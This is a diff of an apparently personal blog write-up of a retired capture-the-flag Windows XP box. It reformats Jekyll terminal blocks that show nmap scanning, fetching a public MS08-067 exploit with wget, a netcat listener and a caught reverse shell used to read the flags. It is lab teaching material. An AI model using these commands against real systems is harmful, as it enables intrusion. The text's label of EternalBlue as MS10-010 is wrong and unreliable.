@@ -27,8 +27,7 @@ Thanks for coming back.  Still doing more boxes deep in the retired archives.
 
 Kick-off by running nmap to discover all of the ports running on the server.
 
-{% raw %}
-```sh
+{% capture nmap %}
 └──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.10.4
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 06:51 CST
 Nmap scan report for 10.10.10.4
@@ -40,16 +39,17 @@ PORT    STATE SERVICE      VERSION
 445/tcp open  microsoft-ds Windows XP microsoft-ds
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run the vulnerability category of nmap scripts to run all of the scripts class as vuln.  Notice that the SMB server is vulnerable to MS08-067.  It is also vulnerabile to Enternal Blue (MS10-010).
 
-{% raw %}
-```sh
-
+{% capture vulnchk %}
 <snip>
 
 | smb-vuln-ms08-067: 
@@ -82,9 +82,12 @@ Run the vulnerability category of nmap scripts to run all of the scripts class a
 |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=vulnchk %}
 
 <br />
 Google the MS08-067 and find the following exploit on the GitHub.
@@ -99,20 +102,21 @@ Google the MS08-067 and find the following exploit on the GitHub.
 <br />
 Reviewing the exploit.  We need to install nclib for the best experience.  So, intall it.
 
-{% raw %}
-```sh
+{% capture nclib %}
 └──╼ [★]$ pip install nclib
 Defaulting to user installation because normal site-packages is not writeable
 Requirement already satisfied: nclib in /usr/local/lib/python3.11/dist-packages (1.0.5)
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nclib %}
 
 <br />
 Download the python script into the local working folder.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 └──╼ [★]$ wget https://gist.githubusercontent.com/jrmdev/5881544269408edde11335ea2b5438de/raw/000546fe015a92e7837d4a82def7c90020d39b08/ms08-067.py
 --2025-01-17 07:02:35--  https://gist.githubusercontent.com/jrmdev/5881544269408edde11335ea2b5438de/raw/000546fe015a92e7837d4a82def7c90020d39b08/ms08-067.py
 Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
@@ -124,20 +128,25 @@ Saving to: ‘ms08-067.py’
 ms08-067.py                                     100%[=====================================================================================================>]   7.10K  --.-KB/s    in 0s      
 
 2025-01-17 07:02:36 (50.3 MB/s) - ‘ms08-067.py’ saved [7272/7272]
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadexploit %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Execute the script.
@@ -150,8 +159,7 @@ Execute the script.
 <li>Listener Port</li>
 </ul>
 
-{% raw %}
-```sh
+{% capture runscript %}
 └──╼ [★]$ python ms08-067.py 10.10.10.4 6 445 10.10.14.29 443
                                                                                        
 		@@@@@@@@@@    @@@@@@    @@@@@@@@    @@@@@@              @@@@@@@@     @@@@@@  @@@@@@@@  
@@ -184,31 +192,43 @@ Traceback (most recent call last):
   File "/usr/local/lib/python3.11/dist-packages/nclib/server.py", line 32, in __init__
     self.sock.bind(bindto)
 OSError: [Errno 98] Address already in use
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runscript %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.4] 1032
+{% endcapture %}
+
+{% capture windowsshell %}
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=windowsshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Documents and Settings\john\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -224,14 +244,17 @@ Ethernet adapter Local Area Connection:
         IP Address. . . . . . . . . . . . : 10.10.10.4
         Subnet Mask . . . . . . . . . . . : 255.255.254.0
         Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -247,8 +270,12 @@ Ethernet adapter Local Area Connection:
         IP Address. . . . . . . . . . . . : 10.10.10.4
         Subnet Mask . . . . . . . . . . . : 255.255.254.0
         Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=rootflag %}
 
 <br />
 Another one down.  Look forward to seeing you in the next one.
